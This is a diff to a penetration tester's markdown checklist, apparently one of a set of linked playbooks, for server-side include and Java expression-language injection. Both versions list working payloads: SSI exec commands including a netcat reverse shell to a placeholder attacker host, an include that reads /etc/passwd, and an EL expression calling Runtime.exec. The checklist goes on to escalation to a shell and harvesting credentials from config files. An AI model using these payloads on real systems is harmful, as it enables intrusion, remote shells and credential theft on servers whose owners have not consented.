@@ -1,32 +1,32 @@
-# SSI / EL Injection
+# SSI and EL injection
 
-## SSI probe
+## SSI: is it parsed
 <!--#echo var="DATE_LOCAL" -->
-- [ ] Renders a date = SSI parsed → exec next
-- [ ] Where: polls, guestbooks, error pages, .shtml/.stm/.shtm URLs
+- [ ] A date comes back: the server parses SSI, so exec next
+- [ ] Where: polls, guestbooks, error pages, and .shtml, .stm and .shtm URLs
 
-## SSI exec
+## SSI: commands
 <!--#exec cmd="id" -->
-<!--#exec cmd="nc ATTACKER 443 -e /bin/bash" -->
+<!--#exec cmd="nc <LHOST> <LPORT> -e /bin/bash" -->
 <!--#include virtual="/etc/passwd" -->
-- [ ] Input must survive sanitization — a reflected <!-- is the signal
+- [ ] My input has to survive the filter: a <!-- that comes back whole is the sign
 
-## EL probe (Java)
+## EL: is it evaluated, in Java
 ${7*7}
 #{7*7}
 *{7*7}
-- [ ] 49 = evaluated → escalate
+- [ ] 49 comes back: evaluated
 
-## EL escalate
+## EL: further
 ${pageContext.request.getSession().getServletContext().getServerInfo()}
 ${T(java.lang.Runtime).getRuntime().exec('id')}
-- [ ] Spring/Thymeleaf variants: T(x) class access, __${...}__::.x preprocessing
-- [ ] EL is the Java slice of SSTI → full methodology: :Pb ssti
+- [ ] Spring and Thymeleaf: T(x) to reach a class, and __${...}__::.x for preprocessing
+- [ ] EL is the Java part of template injection: :Pb ssti
 
 ## If it fails
-- [ ] Payload echoed literally → no injection; encoding variants (HTML entities) before giving up
-- [ ] exec blocked but echo works → file read only: loot configs for creds
+- [ ] The payload comes back as text: no injection, once the HTML-entity forms are tried too
+- [ ] exec blocked but echo and include work: file read only, so configs for credentials
 
 ## Next
-- [ ] exec → stable shell: :Pb shells
-- [ ] Config loot → :Pb linux-creds after landing
+- [ ] Commands: a shell, :Pb shells
+- [ ] Credentials from configs: :Pb linux-creds once on the host
